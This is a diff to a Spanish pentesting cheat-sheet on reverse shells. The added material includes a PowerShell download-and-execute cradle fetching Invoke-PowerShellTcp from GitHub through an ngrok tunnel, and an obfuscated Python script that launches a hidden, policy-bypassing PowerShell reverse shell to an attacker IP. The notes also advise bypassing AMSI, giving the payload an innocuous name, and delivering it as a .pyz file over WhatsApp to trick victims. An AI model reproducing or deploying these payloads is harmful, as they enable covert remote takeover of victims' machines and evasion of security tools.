@@ -1,11 +1,12 @@
 # Tipos de ReverShell
 
-Tags: #ReverShell #Netcat #BindShell #Powershell 
+Tags: #ReverShell #Netcat #BindShell #Powershell #AMSI
 
 Tenemos diferentes tipos de Revershell este pagina Web:
 * [Monkey-Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * [ReverseShells-Generator](https://www.revshells.com/) 
 * [Cheatsheet-ReverseShells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+* [Powershell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
 
 **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndose tomar el control de la máquina remota.
 
@@ -81,6 +82,87 @@ while ($true) {
     Start-Sleep -Seconds 7
 }
 
+```
+
+## Revershell con Powershell
+
+ * [Invoke-PowershellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+```bash 
+❯ ngrok tcp 443         # Exponemos publico el puerto 443 y Ngrok nos devolvera un 'tcp://2.tcp.ngrok.io:19215'. Utilizaremos la parte de '2.tcp.ngrok.io' en IPAddress y '19215' para el Port en el script de la revershell de abajo.  
+
+❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
+```
+
+```bash 
+# Creamos un script con el contenido del enlace de arriba y al final le agregaremos este comando para poder usar Ngrok
+
+❯ nvim Invoke-PowershellTCP.ps1
+
+	Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215 
+
+Nota: 
+	1. Debemos Bypasear AMSI, de lo contrario nos detectara codigo malicioso
+	1. Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
+	2. Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
+```
+
+```bash 
+# Desde la maquina victima con Windows llamamos al script que se encuentra almacenado en nuestro Github, esto lo hace a nivel de memoria por lo que es dificil de detectar y sirve como metodo de evasion
+
+Nota: La url que se coloca es la que nos muestra al momento de darle 'Raw' al script almacenado en 'Github'
+
+❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')"
+
+Nota: 
+	1. Si se ejecuta el comando desde un 'cmd' en Windows colocarlo asi como aparece. Pero si se esta ejecutando desde la consola de PS quitarle 'powershell -c'
+```
+
+## Revershell indetectable con Powershell utilizando Python
+
+```bash 
+Nota: 
+	1. Crear un script en python con la extension '.pyz' para que windows lo pueda ejecutar al abrirlo desde la aplicación de whatsapp 
+```
+
+```python
+import os 
+
+os.system('powershell -nop -W hidden -noni -ep bypass -c "'
+'$u3e = \\"10.10.10.128\\"; '
+'$k6u = 448; '
+'function Connect-Back { '
+'try { '
+'$f1 = New-Object System.Net.Sockets.TCPClient($u3e, $k6u); '
+'$f2 = $f1.GetStream(); '
+'$d5g = New-Object System.IO.StreamReader($f2); '
+'$j2h = New-Object System.IO.StreamWriter($f2); '
+'$j2h.WriteLine(\\"[+] Conexión establecida con la Revershell\\"); '
+'$j2h.WriteLine(\\"[+] Escribe \'exit\' para cerrar la conexión.\\"); '
+'$j2h.Flush(); '
+'while ($true) { '
+'$j2h.Write(\\"PS: \\"); '
+'$j2h.Flush(); '
+'$cmd = $d5g.ReadLine(); '
+'if ($cmd -eq \\"exit\\") { break }; '
+'try { '
+'$output = Invoke-Expression ($cmd) 2>&1; '
+'if ($output -is [System.Collections.IEnumerable]) { '
+'$output = $output | Out-String }; '
+'$output = $output -replace \\"`t\\", \\"    \\"; '
+'$output = $output -replace \\" {2,}\\", \\" \\"; '
+'if ($output) { '
+'$j2h.WriteLine(\\"[*] Resultado del comando:\\"); '
+'$j2h.WriteLine($output) } '
+'} catch { '
+'$j2h.WriteLine(\\"[!] Error ejecutando el comando: $_\\") } '
+'$j2h.Flush() }; '
+'$d5g.Close(); '
+'$j2h.Close(); '
+'$f1.Close() } '
+'catch { Write-Host \\"[!] Error al conectar con el servidor del atacante: $_\\" -ForegroundColor Red } '
+'}; '
+'Connect-Back"')
 ```
 
 ## Webshell/ReverseShell en Kali
